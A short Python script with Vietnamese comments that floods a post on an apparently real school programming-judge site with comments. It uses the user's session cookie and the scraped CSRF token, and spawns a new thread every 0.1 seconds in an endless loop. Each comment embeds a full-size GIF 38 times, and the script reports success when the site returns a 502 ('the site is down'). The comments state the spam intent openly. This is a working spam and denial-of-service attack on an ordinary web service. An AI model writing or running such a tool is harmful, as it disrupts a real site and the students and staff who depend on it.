import requests
import time
import threading
from datetime import datetime

url = "https://lqdoj.edu.vn/post/307-tht-tk-testing-round"
# Không thích cái đó thì spam cái này https://lqdoj.edu.vn/post/307-tht-tk-testing-round

# Dùng EditThisCookie để lấy sessionid tài khoản của mày nha
# https://chromewebstore.google.com/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg
sessionid = ""

csrftoken = requests.get(url).cookies.get_dict()["csrftoken"]

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
    'Cookie': "csrftoken=" + csrftoken + ";sessionid=" + sessionid,
    'X-CSRFToken': csrftoken,
}

def comment():
    try:
        form_data = {
            'body': "__________________________________________________________________________________________________" + """<img src="https://github.com/LiterallyATrueClown/TailieuQuanTrong/blob/main/TRANDUCBO.gif?raw=true" width="100%" height="100%">""" * 38,
            'csrfmiddlewaretoken': csrftoken,
            'parent': '',
            'image': '',
        }
        res = requests.post(url, data=form_data, headers=headers)
        print(res.status_code)
        if res.status_code == 502:
            print("Web đã sập")
    except:
        pass

while True:
    threading.Thread(target=comment).start()
    time.sleep(0.1)